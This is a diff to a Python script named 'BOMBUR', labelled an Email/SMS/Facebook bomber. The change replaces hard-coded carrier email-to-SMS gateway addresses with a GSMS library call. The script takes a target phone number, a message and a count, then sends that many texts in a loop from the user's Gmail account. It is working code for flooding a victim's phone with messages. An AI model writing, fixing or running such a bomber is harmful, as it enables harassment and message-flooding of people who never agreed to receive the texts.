@@ -5,6 +5,7 @@ __author__ = 'KattStof'
 import smtplib, getpass, time
 from fbchat import Client
 from fbchat.models import *
+from GSMS import GSMS
 print("__________________")
 print("   BOMBUR")
 print("Email/SMS/FaceBook Bomber")
@@ -18,37 +19,28 @@ if choice == '1':
     mailserver.ehlo()
     username = input('Enter Gmail Email Address: ')
     password = getpass.getpass()
-    print("""
-    1)AT&T
-    2)Verizon
-    3)T-Mobile
-    4)Sprint
-    5)VirginMobile
-    6)USCellular
-    7)Boost
-    """)
+    print(' 1)AT&T \n 2)Verizon \n 3)T-Mobile \n 4)Sprint \n 5)VirginMobile \n 6)USCellular \n 7)Boost')
     carrier = input('Enter Phone Carrier: ')
     number = input('Enter Phone Number: ')
-    texttosend = input("Text to send: ")
+    message = input("Messge to send: ")
     ammount = int(input('Number of texts to send: '))
     if carrier == '1':
-        sendto = number + '@text.att.net'
+        carrier = 'att'
     elif carrier == '2':
-        sendto = number + '@vtext.com'
+        carrier = 'verizon'
     elif carrier == '3':
-        sendto = number + '@tmomail.net'
+        carrier = 'tmobile'
     elif carrier == '4':
-        sendto = number + '@messaging.sprintpcs.com'
+        carrier = 'sprint'
     elif carrier == '5':
-        sendto = number + '@vmobl.com'
+        carrier = 'virgin'
     elif carrier == '6':
-        sendto = number + '@email.uscc.net'
+        carrier = 'uscellular'
     elif carrier == '7':
-        sendto = number + '@myboostmobile.com'
-    mailserver.login(username,password)
+        carrier = 'boost'
     for x in range(ammount):
         time.sleep(2)
-        mailserver.sendmail(username, sendto, texttosend)
+        GSMS.sms(username, password, number,carrier,message)
         print ('Sending text #', x + 1)
     print (str(ammount)," Text sent to " ,number, " successfully")
 if choice == '2':
